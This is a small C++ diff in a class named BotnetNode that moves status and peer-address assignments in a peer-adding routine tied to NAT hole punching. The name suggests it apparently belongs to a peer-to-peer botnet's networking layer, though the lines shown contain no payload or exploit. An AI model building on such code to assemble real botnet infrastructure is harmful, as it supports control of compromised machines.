@@ -72,11 +72,12 @@ struct sockaddr_in BotnetNode::addPeer(
 		{
 			/* add to tree */
 			_branches.push_back(new BotnetNode(private_addr.sin_addr.s_addr, private_addr.sin_port));
-			pack->private_peer.ip == 0 ? *status = 1 : *status = 3; // successful local (reply back if 1, skip stage 2 (PunchHole)).
-
-			/* raw addr of peer (return) */
-			peer_addr = private_addr;
 		}
+
+		pack->private_peer.ip == 0 ? *status = 1 : *status = 3; // successful local (reply back if 1, skip stage 2 (PunchHole)).
+
+		/* raw addr of peer (return) */
+		peer_addr = private_addr;
 	}
 	else // peer is not local
 
